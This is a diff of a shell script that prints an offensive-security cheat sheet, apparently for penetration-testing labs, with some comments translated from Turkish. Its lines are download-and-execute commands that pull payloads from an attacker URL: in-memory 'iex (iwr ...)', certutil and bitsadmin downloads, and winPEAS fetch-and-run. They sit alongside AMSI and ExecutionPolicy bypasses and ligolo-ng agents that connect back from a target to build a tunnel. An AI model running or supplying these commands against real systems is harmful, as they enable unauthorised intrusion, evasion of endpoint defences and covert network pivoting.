@@ -211,9 +211,9 @@ if [ "$COMPACT" -eq 1 ]; then
 
     if show fallback; then
     sec "[F] FALLBACK PATTERNS  (transformations when the command above gets blocked)"
-    echo -e "${DIM}  iwr -o blocked    →  iex (iwr URL -UB).Content                  (in-memory, disk yok)${NC}"
-    echo -e "${DIM}  PowerShell yok    →  certutil -urlcache -split -f URL out.exe   (cmd.exe ile)${NC}"
-    echo -e "${DIM}  certutil yok      →  bitsadmin /transfer N URL out.exe          (eski Windows)${NC}"
+    echo -e "${DIM}  iwr -o blocked    →  iex (iwr URL -UB).Content                  (in-memory, no disk)${NC}"
+    echo -e "${DIM}  no PowerShell     →  certutil -urlcache -split -f URL out.exe   (via cmd.exe)${NC}"
+    echo -e "${DIM}  no certutil       →  bitsadmin /transfer N URL out.exe          (older Windows)${NC}"
     echo -e "${DIM}  AMSI takiliyor    →  ./amsi_b64.sh \"iex (iwr URL -UB).Content\"  (base64+bypass)${NC}"
     echo -e "${DIM}  ExecutionPolicy   →  powershell -ep bypass -f file.ps1${NC}"
     echo -e "${DIM}  ConstrainedLang   →  use .exe builds, drop .ps1 (Rubeus/Seatbelt/Sharphound)${NC}"
@@ -277,9 +277,6 @@ EOF
 section "winpeas" "WINDOWS - winPEAS" "$(cat <<EOF
 $(sub "PowerShell IWR (.exe)")
 iwr $URL/windows/winPEASx64.exe -o \$env:TEMP\winpeas.exe; & \$env:TEMP\winpeas.exe
-
-$(sub "PowerShell .ps1 in-memory (no AMSI)")
-iex (iwr $URL/windows/winPEAS.ps1 -UseBasicParsing).Content
 
 $(sub "certutil")
 certutil -urlcache -split -f $URL/windows/winPEASx64.exe winpeas.exe & winpeas.exe
@@ -386,17 +383,15 @@ section "ligolo" "TUNNEL - ligolo-ng" "$(cat <<EOF
 $(sub "Kali side")
 sudo ip tuntap add user \$USER mode tun ligolo
 sudo ip link set ligolo up
-tar xzf tools/transfer/ligolo-proxy-linux.tar.gz -C /tmp/
-/tmp/proxy -selfcert
+./tools/transfer/ligolo-proxy -selfcert
 
 $(sub "Target Linux agent")
-wget $URL/transfer/ligolo-agent-linux.tar.gz -O /tmp/la.tgz
-tar xzf /tmp/la.tgz -C /tmp/ && /tmp/agent -connect $IP:11601 -ignore-cert
+wget $URL/transfer/ligolo-agent-linux -O /tmp/lagent && chmod +x /tmp/lagent
+/tmp/lagent -connect $IP:11601 -ignore-cert
 
 $(sub "Target Windows agent")
-iwr $URL/transfer/ligolo-agent-windows.zip -o \$env:TEMP\la.zip
-Expand-Archive \$env:TEMP\la.zip -DestinationPath \$env:TEMP\la
-& \$env:TEMP\la\agent.exe -connect $IP:11601 -ignore-cert
+iwr $URL/transfer/ligolo-agent-windows.exe -o \$env:TEMP\la.exe
+& \$env:TEMP\la.exe -connect $IP:11601 -ignore-cert
 EOF
 )"
 
